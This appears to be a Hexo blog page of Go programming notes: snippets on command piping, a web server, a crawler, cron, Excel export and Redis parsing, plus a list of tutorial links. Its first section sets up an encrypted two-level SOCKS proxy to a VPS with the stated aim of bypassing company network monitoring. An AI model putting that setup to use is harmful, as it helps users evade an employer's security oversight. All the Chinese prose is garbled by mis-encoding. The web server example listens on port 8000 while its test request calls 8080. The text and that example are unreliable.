<h3 id="ä½¿ç”¨-Proxy-çªç ´ç½‘ç®¡çš„é™åˆ¶"><a href="#ä½¿ç”¨-Proxy-çªç ´ç½‘ç®¡çš„é™åˆ¶" class="headerlink" title="ä½¿ç”¨ Proxy çªç ´ç½‘ç®¡çš„é™åˆ¶"></a>ä½¿ç”¨ Proxy çªç ´ç½‘ç®¡çš„é™åˆ¶</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//gitee.com/snail/proxy</span></span><br><span class="line">ä¸ºäº†ç»•å¼€å…¬å¸ç½‘ç»œçš„ç›‘æµ‹ï¼Œéœ€è¦åŠ å¯†æœ¬åœ°å‘å¾€ä»£ç†æœåŠ¡å™¨çš„æ•°æ®ï¼Œç„¶åç”±ä»£ç†æœåŠ¡å™¨è§£å¯†æ•°æ®ï¼Œå†å‘å¾€çœŸæ­£çš„æœåŠ¡å™¨ï¼Œå› äº›æˆ‘ä»¬éœ€è¦ä¸¤çº§ä»£ç†</span><br><span class="line">./proxy keygen -C proxy</span><br><span class="line">æ‰§è¡Œå‘½ä»¤ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ proxy.key å’Œ proxy.crt ä¸¤ä¸ªæ–‡ä»¶ï¼Œå°†è¿™ä¸¤ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°æœ¬æœºçš„ <span class="built_in">Proxy</span> å®‰è£…ç›®å½•ä¸­</span><br><span class="line">åœ¨ VPS ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š</span><br><span class="line">./proxy socks -t tls -p <span class="string">":3333"</span> -C proxy.crt -K proxy.key --daemon --forever --log proxy.log</span><br><span class="line"></span><br><span class="line">æœ¬æœºæ‰“å¼€ <span class="built_in">Proxy</span> å®‰è£…ç›®å½•ä¸­çš„ â€œbootstrap.batâ€ æ–‡ä»¶ï¼Œå°† â€œproxy.exe ...â€ è¿™ä¸€è¡Œä¿®æ”¹ä¸ºï¼š</span><br><span class="line"></span><br><span class="line">proxy.exe socks -p <span class="string">":3334"</span> -t tcp -T tls -P <span class="string">"IP:3333"</span> -C proxy.crt -K proxy.key --debug</span><br><span class="line">å…¶ä¸­å°å†™ <span class="string">"p"</span> è¡¨ç¤ºæœ¬æœºç›‘å¬ç«¯å£ï¼Œå¤§å†™ â€œPâ€ è¡¨ç¤º VPS ç«¯ç›‘å¬åœ°å€ï¼Œå°å†™ â€œtâ€ è¡¨ç¤ºæœ¬æœºä½¿ç”¨çš„ä¼ è¾“åè®®ï¼Œå¤§å†™ â€œTâ€ è¡¨ç¤º VPS ç«¯ä½¿ç”¨çš„ä¼ è¾“åè®®ã€‚ä¿å­˜æ–‡ä»¶åï¼ŒåŒå‡» â€œbootstrap.batâ€ å³å¯å¯åŠ¨ <span class="built_in">Proxy</span>ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32369</span></span><br></pre></td></tr></table></figure>
<h3 id="go-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ç®¡é“ç¬¦"><a href="#go-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ç®¡é“ç¬¦" class="headerlink" title="go æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ç®¡é“ç¬¦"></a>go æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ç®¡é“ç¬¦</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•ä¸€ï¼ˆå¼‚æ­¥ï¼‰</span><br><span class="line"></span><br><span class="line">func <span class="keyword">async</span>() &#123;</span><br><span class="line">    cmd1 := exec.Command(<span class="string">"ls"</span>, <span class="string">"."</span>)</span><br><span class="line">    cmd2 := exec.Command(<span class="string">"grep"</span>, <span class="string">"go"</span>)</span><br><span class="line">    out, <span class="attr">_</span> := cmd1.StdoutPipe()</span><br><span class="line">    <span class="keyword">in</span>, <span class="attr">_</span> := cmd2.StdinPipe()</span><br><span class="line">    cmd2.Stdout = os.Stdout</span><br><span class="line">    go func() &#123;</span><br><span class="line">        defer func() &#123;</span><br><span class="line">            out.Close()</span><br><span class="line">            <span class="keyword">in</span>.Close()</span><br><span class="line">        &#125;()</span><br><span class="line">        io.Copy(<span class="keyword">in</span>, out)</span><br><span class="line">    &#125;()</span><br><span class="line">    cmd1.Run()</span><br><span class="line">    cmd2.Run()</span><br><span class="line">&#125;</span><br><span class="line">æ–¹æ³•äºŒï¼ˆåŒæ­¥ï¼‰</span><br><span class="line"></span><br><span class="line">func sync() &#123;</span><br><span class="line">    cmd1 := exec.Command(<span class="string">"ls"</span>, <span class="string">"."</span>)</span><br><span class="line">    cmd2 := exec.Command(<span class="string">"grep"</span>, <span class="string">"go"</span>)</span><br><span class="line">    <span class="keyword">in</span>, <span class="attr">_</span> := cmd2.StdinPipe()</span><br><span class="line">    cmd1.Stdout = <span class="keyword">in</span></span><br><span class="line">    cmd2.Stdout = os.Stdout</span><br><span class="line">    cmd2.Start()</span><br><span class="line">    cmd1.Run()</span><br><span class="line">    <span class="keyword">in</span>.Close()</span><br><span class="line">    cmd2.Wait()</span><br><span class="line">&#125;</span><br><span class="line">æ–¹æ³•ä¸‰ï¼ˆå¤šä¸ªï¼‰</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    cmd1 := exec.Command(<span class="string">"ls"</span>, <span class="string">"."</span>)</span><br><span class="line">    cmd2 := exec.Command(<span class="string">"grep"</span>, <span class="string">"go"</span>)</span><br><span class="line">    cmd3 := exec.Command(<span class="string">"grep"</span>, <span class="string">"main"</span>)</span><br><span class="line">    cmd3.Stdout = os.Stdout</span><br><span class="line">    pipe(cmd1, cmd2, cmd3)</span><br><span class="line">    cmd1.Run()</span><br><span class="line">    cmd2.Run()</span><br><span class="line">    cmd3.Run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func pipe(cmds ...*exec.Cmd) &#123;</span><br><span class="line">    <span class="keyword">for</span> i, <span class="attr">cmd</span> := range cmds &#123;</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> &#123;</span><br><span class="line">            out, <span class="attr">_</span> := cmds[i<span class="number">-1</span>].StdoutPipe()</span><br><span class="line">            <span class="keyword">in</span>, <span class="attr">_</span> := cmd.StdinPipe()</span><br><span class="line">            go func() &#123;</span><br><span class="line">                defer func() &#123;</span><br><span class="line">                    out.Close()</span><br><span class="line">                    <span class="keyword">in</span>.Close()</span><br><span class="line">                &#125;()</span><br><span class="line">                io.Copy(<span class="keyword">in</span>, out)</span><br><span class="line">            &#125;()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33592</span></span><br></pre></td></tr></table></figure>
<h3 id="å®ç°ä¸€ä¸ª-web-æœåŠ¡å™¨"><a href="#å®ç°ä¸€ä¸ª-web-æœåŠ¡å™¨" class="headerlink" title="å®ç°ä¸€ä¸ª web æœåŠ¡å™¨"></a>å®ç°ä¸€ä¸ª web æœåŠ¡å™¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"io"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">"/hello"</span>, helloHandler)</span><br><span class="line">    err := http.ListenAndServe(<span class="string">":8000"</span>, nil)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        log.Fatal(<span class="string">"ListenAndServe:"</span>, err.Error())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func helloHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    io.WriteString(w, <span class="string">"hello, world!"</span>)</span><br><span class="line">&#125;</span><br><span class="line">$ go run hello.go</span><br><span class="line">$ curl http:<span class="comment">//localhost:8080/hello</span></span><br><span class="line">hello, world!</span><br><span class="line">https:<span class="comment">//learnku.com/golang/wikis/26652</span></span><br></pre></td></tr></table></figure>
<h3 id="Go-çˆ¬è™«æ¡†æ¶"><a href="#Go-çˆ¬è™«æ¡†æ¶" class="headerlink" title="Go çˆ¬è™«æ¡†æ¶"></a>Go çˆ¬è™«æ¡†æ¶</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/zhshch2002/goribot  </span></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"encoding/json"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"github.com/zhshch2002/goribot"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    s := goribot.NewSpider()</span><br><span class="line">    _ = s.Get(nil, <span class="string">"https://httpbin.org/get?Goribot%20test=hello%20world"</span>, func(r *goribot.Response) &#123;</span><br><span class="line">        m := make(map[string]interface&#123;&#125;)</span><br><span class="line">        err := json.Unmarshal([]byte(r.Text), &amp;m)</span><br><span class="line">        <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(m)</span><br><span class="line">    &#125;)</span><br><span class="line">    s.Run()</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/33980</span></span><br></pre></td></tr></table></figure>
<p>###goå‘½ä»¤è¡Œ<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/cosmos72/gomacro</span><br><span class="line">Î» gomacro.exe</span><br><span class="line"><span class="comment">// GOMACRO, an interactive Go interpreter with generics and macros</span></span><br><span class="line"><span class="comment">// Copyright (C) 2018-2019 Massimiliano Ghilardi &lt;https://github.com/cosmos72/gomacro&gt;</span></span><br><span class="line"><span class="comment">// License MPL v2.0+: Mozilla Public License version 2.0 or later &lt;http://mozilla.org/MPL/2.0/&gt;</span></span><br><span class="line"><span class="comment">// This is free software with ABSOLUTELY NO WARRANTY.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Type :help for help</span></span><br><span class="line">gomacro&gt; a:=<span class="number">1</span></span><br><span class="line">gomacro&gt; a</span><br><span class="line"><span class="number">1</span>       <span class="comment">// int</span></span><br><span class="line">go get -u github.com/motemen/gore/cmd/gore</span><br><span class="line">â¯ gore</span><br><span class="line">gore version <span class="number">0.4</span><span class="number">.1</span>  :help <span class="keyword">for</span> help</span><br><span class="line">gore&gt; a := <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">gore&gt; a + <span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">gore&gt; func Add(a, b int) int &#123; <span class="keyword">return</span> a + b &#125;</span><br><span class="line">gore&gt; Add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<h3 id="go-cron-ç§’"><a href="#go-cron-ç§’" class="headerlink" title="go cron ç§’"></a>go cron ç§’</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/robfig/cron"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    c := cron.New()</span><br><span class="line"></span><br><span class="line">    c.AddFunc(<span class="string">"*/1 * * * * *"</span>, func() &#123;</span><br><span class="line">        fmt.Println(<span class="string">"every 1 seconds executing"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    go c.Start()</span><br><span class="line">    defer c.Stop()</span><br><span class="line"></span><br><span class="line">    select &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(time.Second * 10):</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">&#125;https://learnku.com/articles/34456</span><br><span class="line">Githubï¼šgithub.com/robfig/cron</span><br></pre></td></tr></table></figure>
<h3 id="Go-ä½¿ç”¨åå°„å¯¼å‡º-Excel"><a href="#Go-ä½¿ç”¨åå°„å¯¼å‡º-Excel" class="headerlink" title="Go ä½¿ç”¨åå°„å¯¼å‡º Excel"></a>Go ä½¿ç”¨åå°„å¯¼å‡º Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">type Record struct &#123;</span><br><span class="line">    Name string <span class="string">`xlsx:"A-å§“å"`</span></span><br><span class="line">    Age  int32  <span class="string">`xlsx:"B-å¹´é½¡"`</span></span><br><span class="line">&#125;</span><br><span class="line">func RefactorWrite(records []*Record) &#123;</span><br><span class="line">    xlsx := excelize.NewFile()</span><br><span class="line">    index := xlsx.NewSheet(<span class="string">"Sheet1"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, <span class="attr">t</span> := range records &#123;</span><br><span class="line">        d := reflect.TypeOf(t).Elem()</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; d.NumField(); j++ &#123;</span><br><span class="line">            <span class="comment">// è®¾ç½®è¡¨å¤´</span></span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span> &#123;</span><br><span class="line">                column := strings.Split(d.Field(j).Tag.Get(<span class="string">"xlsx"</span>), <span class="string">"-"</span>)[<span class="number">0</span>]</span><br><span class="line">                name := strings.Split(d.Field(j).Tag.Get(<span class="string">"xlsx"</span>), <span class="string">"-"</span>)[<span class="number">1</span>]</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">1</span>), name)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è®¾ç½®å†…å®¹</span></span><br><span class="line">            column := strings.Split(d.Field(j).Tag.Get(<span class="string">"xlsx"</span>), <span class="string">"-"</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">switch</span> d.Field(j).Type.String() &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"string"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).String())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"int32"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Int())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"int64"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Int())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"bool"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Bool())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"float32"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Float())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"float64"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Float())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xlsx.SetActiveSheet(index)</span><br><span class="line">    <span class="comment">// ä¿å­˜åˆ°xlsxä¸­</span></span><br><span class="line">    err := xlsx.SaveAs(<span class="string">"test_write.xlsx"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="keyword">var</span> records []*Record\</span><br><span class="line">    records = append(records, &amp;Record&#123;\</span><br><span class="line">       Name: <span class="string">"å°æ˜"</span>,\</span><br><span class="line">      Age:  <span class="number">11</span>,\</span><br><span class="line">    &#125;)\</span><br><span class="line">    records = append(records, &amp;Record&#123;\</span><br><span class="line">       Name: <span class="string">"å°å"</span>,\</span><br><span class="line">      Age:  <span class="number">12</span>,\</span><br><span class="line">    &#125;)\</span><br><span class="line">    <span class="comment">// åå°„å†™\</span></span><br><span class="line">    RefactorWrite(records)</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/34635</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-è§£æå·¥å…·"><a href="#Redis-è§£æå·¥å…·" class="headerlink" title="Redis è§£æå·¥å…·"></a>Redis è§£æå·¥å…·</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/8090Lambert/go-redis-parser</span></span><br><span class="line">go get github.com/<span class="number">8090</span>Lambert/go-redis-parser</span><br><span class="line">$ go-redis-parser -rdb &lt;dump.rdb&gt; -o &lt;gen-file folder&gt; -type &lt;gen-file type, json or csv, <span class="keyword">default</span> csv&gt;</span><br><span class="line"></span><br><span class="line">BigKeys çš„è¾“å‡ºç¤ºä¾‹ï¼š</span><br><span class="line"></span><br><span class="line"># Scanning the rdb file to find biggest keys</span><br><span class="line"></span><br><span class="line">-------- summary -------</span><br><span class="line"></span><br><span class="line">Sampled <span class="number">6</span> keys <span class="keyword">in</span> the keyspace!</span><br><span class="line">Total key length <span class="keyword">in</span> bytes is <span class="number">17</span></span><br><span class="line"></span><br><span class="line">Biggest string found <span class="string">'s'</span> has <span class="number">1</span> bytes</span><br><span class="line">Biggest   hash found <span class="string">'h'</span> has <span class="number">1</span> fields</span><br><span class="line">Biggest   list found <span class="string">'li'</span> has <span class="number">2</span> items</span><br><span class="line">Biggest sortedset found <span class="string">'zset'</span> has <span class="number">2</span> members</span><br><span class="line">Biggest    set found <span class="string">'set'</span> has <span class="number">2</span> members</span><br><span class="line">Biggest stream found <span class="string">'stream'</span> has <span class="number">3</span> entries</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> string <span class="keyword">with</span> <span class="number">1</span> bytes</span><br><span class="line"><span class="number">1</span> hash <span class="keyword">with</span> <span class="number">1</span> fields</span><br><span class="line"><span class="number">1</span> list <span class="keyword">with</span> <span class="number">2</span> items</span><br><span class="line">https:<span class="comment">//learnku.com/articles/34655</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/34641" target="_blank" rel="noopener">æ‰¹é‡å¯¼å‡º CSDN åšå®¢å¹¶è½¬ä¸º hexo åšå®¢é£æ ¼</a></p>
<p><a href="https://learnku.com/golang/t/34334" target="_blank" rel="noopener">è­¦æƒ• Go ç¼–ç¨‹é™·é˜±</a></p>
<p><a href="https://learnku.com/articles/34621" target="_blank" rel="noopener">golang IoC</a></p>
<p><a href="https://learnku.com/articles/34190#reply110842" target="_blank" rel="noopener">Golang æ“ä½œ Redis çš„åŸºæœ¬æ–¹æ³•</a></p>
<p><a href="https://learnku.com/golang/t/33859" target="_blank" rel="noopener">Go Modules ä¸å®Œå…¨æ•™ç¨‹</a></p>
<p><a href="https://learnku.com/articles/34299" target="_blank" rel="noopener">Go è·å–å·²æ’å…¥ U ç›˜ç›˜ç¬¦</a></p>
<p><a href="https://learnku.com/golang/t/34095" target="_blank" rel="noopener">å•å…ƒæµ‹è¯•</a></p>
<p><a href="https://github.com/pibigstar/go-demo" target="_blank" rel="noopener">ä¸€äº›ä¾‹å­å’Œå°é¡¹ç›®</a></p>
<p><a href="https://strconv.com/posts/web-crawler-exercise-1/" target="_blank" rel="noopener">ç”¨Golangå†™çˆ¬è™«(ä¸€)</a></p>
<p><a href="https://github.com/levigross/grequests" target="_blank" rel="noopener"> go ç‰ˆæœ¬çš„ requests </a></p>
<p><a href="https://strconv.com/posts/go-repl/?" target="_blank" rel="noopener">goå‘½ä»¤è¡Œ</a></p>
<p><a href="https://book.eddycjy.com/golang/talk/golang-relatively-path.html" target="_blank" rel="noopener">goç³»åˆ—æ•™ç¨‹</a></p>
<p><a href="https://learnku.com/articles/34112" target="_blank" rel="noopener">beego ä»£ç è‡ªåŠ¨ç”Ÿæˆå™¨</a></p>
<p><a href="https://learnku.com/articles/34091" target="_blank" rel="noopener">Go Modules ä½¿ç”¨</a></p>
<p><a href="https://learnku.com/articles/34013" target="_blank" rel="noopener">æ–‡ä»¶ä¼ è¾“ç®¡ç†ç³»ç»ŸBigfile </a></p>
<p><a href="https://github.com/1920853199/go-blog" target="_blank" rel="noopener">åŸºäº beego çš„ï¼Œæœ‰æƒ…æ€€çš„åšå®¢</a></p>
<p><a href="https://learnku.com/articles/34051" target="_blank" rel="noopener">Go åŸºç¡€æ•™ç¨‹â€“2-åŸºç¡€çŸ¥è¯†</a></p>
<p><a href="https://learnku.com/golang/t/33901" target="_blank" rel="noopener">Go è¯­è¨€ RESTful JSON API åˆ›å»º</a></p>
<p><a href="https://learnku.com/articles/33918" target="_blank" rel="noopener">Golang slice ä»æºç æ¥ç†è§£</a></p>
<p><a href="https://learnku.com/articles/33876" target="_blank" rel="noopener">golang gin + gorm + seesion å®Œæˆ Laravel çš„ make:auth</a></p>
<p><a href="https://learnku.com/articles/33873" target="_blank" rel="noopener">Golang å­¦ä¹ å®åº“</a></p>
<p><a href="https://github.com/pibigstar/go-demo" target="_blank" rel="noopener">å­¦ä¹ goè¯­è¨€è¿‡ç¨‹ä¸­å†™çš„ä¸€äº›ä¾‹å­å’Œå°é¡¹ç›®</a></p>
<p><a href="https://learnku.com/articles/33708" target="_blank" rel="noopener">Go å®ç°å¸¸ç”¨è®¾è®¡æ¨¡å¼ï¼ˆåï¼‰è´£ä»»é“¾æ¨¡å¼</a></p>
<p><a href="https://juejin.im/post/5ce4dc17518825240245be5b" target="_blank" rel="noopener">Go è¯­è¨€å‘½ä»¤æ¦‚è§ˆ</a></p>
<p><a href="https://learnku.com/articles/33601" target="_blank" rel="noopener">å¯†ç å­¦ä¹‹å¯¹ç§°åŠ å¯†</a></p>
<p><a href="https://www.guaosi.com/2019/03/14/golang-linkedlist/" target="_blank" rel="noopener">golangç®—æ³•ä¸æ•°æ®ç»“æ„</a></p>
<p><a href="https://github.com/xusenlin/ForestBlog" target="_blank" rel="noopener">ç”¨æ¥å±•ç¤º markdown æ–‡æ¡£çš„åšå®¢</a></p>
<p><a href="https://learnku.com/articles/32582" target="_blank" rel="noopener">ã€GoLang é‚£ç‚¹äº‹ã€‘Go æŒ‡é’ˆ</a></p>
<p><a href="http://www.golang365.com/#/blog/76" target="_blank" rel="noopener">goè¯­è¨€ä¸­çš„æ¥å£</a></p>
<p><a href="https://learnku.com/golang/t/32493" target="_blank" rel="noopener">Go è¯­è¨€é¢å‘å¯¹è±¡ç‰¹æ€§</a></p>
<p><a href="https://learnku.com/golang/t/34202" target="_blank" rel="noopener">å¦‚ä½•å†™å‡ºä¼˜é›…çš„ Golang ä»£ç </a></p>
<p><a href="https://learnku.com/articles/34243" target="_blank" rel="noopener">å†…éƒ¨ API çš„å®‰å…¨</a></p>
<p><a href="https://gfw.go101.org/article/channel.html" target="_blank" rel="noopener"> Go è¯­è¨€é€šé“åŸç†</a></p>
<p><a href="https://learnku.com/articles/32316" target="_blank" rel="noopener">Golang å†™çˆ¬è™«</a></p>
